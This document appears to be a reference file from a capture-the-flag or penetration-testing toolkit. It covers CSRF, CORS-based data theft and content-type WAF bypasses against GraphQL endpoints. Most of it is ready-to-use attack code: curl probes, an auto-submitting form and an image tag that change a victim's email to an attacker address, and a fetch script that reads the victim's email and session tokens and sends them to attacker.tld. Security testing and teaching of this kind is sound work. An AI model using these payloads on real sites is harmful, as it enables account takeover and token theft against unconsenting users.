# CSRF and transport attacks against GraphQL

GraphQL's transport flexibility is the bug: an endpoint accepting
`application/x-www-form-urlencoded` or GET requests is CSRF-able for reads —
and, on sloppy servers, for mutations too. The endpoint's accept-matrix
decides which CSRF variant applies. Owned by `skills/web-csrf/` at the class
level; this file is the GraphQL-specific carrier surface.

---

## 1. The accept matrix — probe all of it first

```bash
# POST + JSON (the normal)
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'

# POST + form-encoded — CSRF door #1
curl -s "$BASE/graphql" -d 'query={__typename}'

# GET — CSRF door #2
curl -s "$BASE/graphql?query=%7B__typename%7D"

# POST + application/graphql — raw body
curl -s "$BASE/graphql" -H 'Content-Type: application/graphql' -d '{__typename}'

# POST + text/plain — "simple request" CSRF (no preflight needed!)
curl -s "$BASE/graphql" -H 'Content-Type: text/plain' -d '{"query":"{__typename}"}'

# POST + multipart — upload-capable, also simple-request
curl -s "$BASE/graphql" -F 'query={__typename}'
```

Each accept widens the attack surface differently:

| Accepts | Exploit consequence |
|---|---|
| form-urlencoded | Full CSRF for queries+mutations — `<form>` posts it natively |
| GET | CSRF with a `<img>` tag; cache-poisoning surface; logged in proxies |
| text/plain or any-CT | "Simple request" CSRF — no CORS preflight required; JS fetch with `text/plain` skips preflight |
| multipart/form-data | Upload mutations CSRF-able; also a simple request |
| JSON only | CSRF blocked UNLESS CORS is also permissive (then it's XS via fetch) — check `web-cors` |

## 2. CSRF for state changes

The deadly combo: mutation accepted via form-encoding or GET, and the session
cookie is `SameSite=None`/`Lax`-bypassable or absent-samesite:

```html
<!-- attacker page — auto-submitting form -->
<form action="https://victim.tld/graphql" method="POST">
  <input name="query" value='mutation{updateEmail(email:"attacker@x.tld"){ok}}'>
  <input name="variables" value='{}'>
  <input name="operationName" value=''>
</form>
<script>document.forms[0].submit()</script>
```

GET version — pure image tag, works even with `SameSite=Lax` (top-level GET):

```html
<img src="https://victim.tld/graphql?query=mutation{updateEmail(email:%22attacker@x.tld%22){ok}}">
```

Mutations over GET violate the spec — but **graphql-yoga, express-graphql,
and several Go/Rust servers execute them anyway**. Always probe:
`GET /graphql?query=mutation{...}`.

## 3. CSRF for reads — XS exfil through permissive CORS

Reads need the *response* back — that requires CORS to allow the origin
(`Access-Control-Allow-Origin: <reflected>` or `*` with credentials). Probe:

```bash
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -H 'Origin: https://attacker.tld' \
  -d '{"query":"{me{email}}"}' -i | grep -i 'access-control'
```

- `ACAO: https://attacker.tld` + `ACAC: true` → fetch-based XS exfil:

```html
<script>
fetch('https://victim.tld/graphql',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{"query":"{me{email sessions{token}}}"}'})
.then(r=>r.text()).then(t=>fetch('//attacker.tld/?d='+btoa(t)))
</script>
```

This is `skills/web-cors/` territory — GraphQL just makes the payload a
single reusable document covering *all* data.

- `ACAO: *` + no credentials → response readable but not authenticated —
  combine with token-in-arg patterns (`{flag(token:"<leaked>")}`).

## 4. Content-Type confusion → WAF bypass

A WAF inspecting only `application/json` bodies misses the same query under:

- `application/x-www-form-urlencoded`: `query=mutation{...}`
- `application/graphql`: raw document body
- `text/plain`: JSON-shaped body that lenient parsers still accept
- `multipart/form-data`: `operations` + `map` fields

```bash
curl -s "$BASE/graphql" -H 'Content-Type: text/plain' \
  -d '{"query":"{admin{secrets}}"}'
```

If the WAF/WACL blocks `{admin` in JSON-CT but text/plain sails through with
200 — that is the bypass. Details: `waf-bypass.md`.

## 5. SameSite and cookie-context tests

The session carrier matters:

```bash
# Does the endpoint authenticate via cookie?
curl -s "$BASE/graphql" -H 'Cookie: session=...' -d '{"query":"{me{id}}"}' ...

# Check the cookie attributes
curl -s -I "$BASE/" | grep -i 'set-cookie'
# SameSite=None; Secure  → CSRF-able cross-site
# SameSite=Lax           → top-level GET CSRF-able only
# SameSite=Strict        → safe; try subdomain takeover / sibling-app XSS
```

## 6. GET + cache: a subtle poisoning

GET-accepting endpoints put the query document *in the URL* — URLs get cached
by CDNs/proxies. If `?query={me{email}}` is cacheable, the victim's
authenticated response could be served to others — the
`skills/web-cache-poisoning/` class. Probe `Cache-Control`, `Age`, and CDN
behavior on the GET route. Also, URLs get logged — tokens in `?query=` leak
into proxy logs; relevant for writeups, less for solving.

## 7. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "endpoint accepts form-encoded POST — mutation CSRF viable"
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql CT:form-urlencoded query={__typename}' \
  --verdict confirms --evidence-kind class --class web-csrf \
  --hypothesis-id h6 --evidence '"data":{"__typename":"Query"}' \
  --response '<verbatim>'
```

The CSRF finding's class is `web-csrf` (or `web-cors`) — GraphQL is the
carrier. Record the bug-class ledger under the owning class.
